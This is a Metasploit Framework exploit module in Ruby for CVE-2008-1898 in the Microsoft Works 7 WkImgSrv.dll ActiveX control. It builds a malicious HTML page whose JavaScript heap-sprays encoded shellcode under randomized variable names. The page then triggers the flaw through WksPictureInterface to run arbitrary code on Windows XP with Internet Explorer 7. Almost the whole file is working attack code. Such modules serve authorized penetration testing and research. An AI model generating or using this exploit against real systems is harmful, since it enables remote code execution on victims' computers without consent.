##
# $Id: msworks_wkspictureinterface.rb 10477 2010-09-25 11:59:02Z mc $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = LowRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Works 7 WkImgSrv.dll WKsPictureInterface() ActiveX Exploit',
			'Description'    => %q{
					The Microsoft Works ActiveX control (WkImgSrv.dll) could allow a remote attacker
				to execute arbitrary code on a system. By passing a negative integer to the
				WksPictureInterface method, an attacker could execute arbitrary code on the system
				with privileges of the victim. Change 168430090 /0X0A0A0A0A to 202116108 / 0x0C0C0C0C FOR IE6.
				This control is not marked safe for scripting, please choose your attack vector carefully.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'dean <dean [at] zerodaysolutions [dot] com>' ],
			'Version'        => '$Revision: 10477 $',
			'References'     =>
				[
					[ 'CVE','2008-1898' ],
					[ 'OSVDB', '44458'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'DisablePayloadHandler' => 'true',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP2-SP3 IE 7.0', { 'Ret' => 0x0A0A0A0A } ]
				],
			'DisclosureDate' => 'Nov 28 2008',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.',  'msf.html']),
			], self.class)
	end

	def exploit

		# Encode the shellcode.
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		# Set the return.
		ret     = Rex::Text.to_unescape([target.ret].pack('L'))

		# Randomize the javascript variable names.
		vname  = rand_text_alpha(rand(10) + 1)
		var_i  = rand_text_alpha(rand(10) + 1)
		rand1  = rand_text_alpha(rand(100) + 1)
		rand2  = rand_text_alpha(rand(100) + 1)
		rand3  = rand_text_alpha(rand(100) + 1)
		rand4  = rand_text_alpha(rand(100) + 1)
		rand5  = rand_text_alpha(rand(100) + 1)
		rand6  = rand_text_alpha(rand(100) + 1)
		rand7  = rand_text_alpha(rand(100) + 1)

		content = %Q|
<html>
<object id='#{vname}' classid='clsid:00E1DB59-6EFD-4CE7-8C0A-2DA3BCAAD9C6'></object>
<body>
<script language="JavaScript">
var #{rand1} = unescape('#{shellcode}');
var #{rand2} = unescape('#{ret}');
var #{rand3} = 20;
var #{rand4} = #{rand3} + #{rand1}.length;
while (#{rand2}.length < #{rand4}) #{rand2} += #{rand2};
var #{rand5} = #{rand2}.substring(0,#{rand4});
var #{rand6} = #{rand2}.substring(0,#{rand2}.length - #{rand4});
while (#{rand6}.length + #{rand4} < 0x10000) #{rand6} = #{rand6} + #{rand6} + #{rand5};
var #{rand7} = new Array();
for (#{var_i} = 0; #{var_i} < 1000; #{var_i}++){ #{rand7}[#{var_i}] = #{rand6} + #{rand1} }
#{vname}.WksPictureInterface = 168430090;
</script>
</body>
</html>
|

		print_status("Creating HTML file ...")

		file_create(content)
	end

end
